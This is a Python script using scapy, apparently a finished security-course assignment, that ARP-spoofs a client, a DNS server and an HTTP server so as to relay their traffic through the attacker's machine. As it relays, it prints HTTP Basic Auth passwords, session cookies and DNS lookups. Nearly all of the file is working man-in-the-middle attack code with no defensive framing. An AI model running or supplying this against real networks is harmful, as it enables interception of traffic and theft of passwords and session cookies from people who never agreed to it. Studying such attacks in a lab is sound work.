from scapy.all import *
from scapy.layers.http import *
import argparse
import sys
import threading
import time
import base64

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--dnsIP", help="IP of the dns server", required=True)
    parser.add_argument("-ip3", "--httpIP", help="IP of the http server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# DONE: returns the mac address for an IP
def mac(IP):
    
    return srp1(Ether(dst="ff:ff:ff:ff:ff:ff", type=0x806) / ARP(op=1, pdst=IP, hwdst="00:00:00:00:00:00") ).hwsrc


#ARP spoofs client, httpServer, dnsServer
def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
    while True:
        spoof(httpServerIP, attackerMAC, clientIP, clientMAC) # DONE: Spoof client ARP table
        spoof(clientIP, attackerMAC, httpServerIP, httpServerMAC) # DONE: Spoof httpServer ARP table
        spoof(dnsServerIP, attackerMAC, clientIP, clientMAC) # DONE: Spoof client ARP table
        spoof(clientIP, attackerMAC, dnsServerIP, dnsServerMAC) # DONE: Spoof dnsServer ARP table
        time.sleep(interval)
    


# DONE: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    sendp(Ether(src=srcMAC, dst=dstMAC, type=0x806) / ARP(op=2, psrc=srcIP, pdst=dstIP, hwsrc=srcMAC) )





# DONE: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    sendp(Ether(src=srcMAC, dst=dstMAC, type=0x806) / ARP(op=2, psrc=srcIP, pdst=dstIP, hwsrc=srcMAC) )


# DONE: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
def interceptor(packet):
    global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
    #if not ((TCP in packet and (packet[TCP].sport == 22 or packet[TCP].dport == 22)) or ARP in packet):
    if packet.src != attackerMAC:
        if IP in packet:
            #print(packet.summary())
            ip_dst = packet[IP].dst
            if ip_dst == clientIP:
                sendp(Ether(dst=clientMAC) / packet[IP])
            elif ip_dst == dnsServerIP:
                sendp(Ether(dst=dnsServerMAC) / packet[IP])
            if ip_dst == httpServerIP:
                sendp(Ether(dst=httpServerMAC) / packet[IP])

            if packet.haslayer(HTTPRequest):
                encoded = packet[HTTPRequest].Authorization.decode().split(" ")[-1]
                decoded = base64.b64decode(encoded).decode('utf-8')
                debug("Authorization:" + decoded)
                pwd = decoded.split(":")[-1]
                print("*basicauth:%s" % pwd)
            elif packet.haslayer(HTTPResponse):
                cookie = packet[HTTPResponse].Set_Cookie.decode()
                debug("Cookie:" + cookie)
                print("*cookie:%s" % cookie)
            elif packet.haslayer(DNSQR) and not packet.haslayer(DNSRR):
                qname = packet[DNSQR].qname.decode()
                debug("qname:" + qname)
                print("*hostname:%s" % qname)
            elif packet.haslayer(DNSRR):
                rdata = packet[DNSRR].rdata
                debug("ancount: %d, rdata: %s" % (packet[DNS].ancount, packet[DNSRR].rdata))
                print("*hostaddr:%s" % rdata)

if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    httpServerIP = args.httpIP
    dnsServerIP = args.dnsIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    httpServerMAC = mac(httpServerIP)
    dnsServerMAC = mac(dnsServerIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
        restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
        restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
        restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
    restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
    restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
    restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
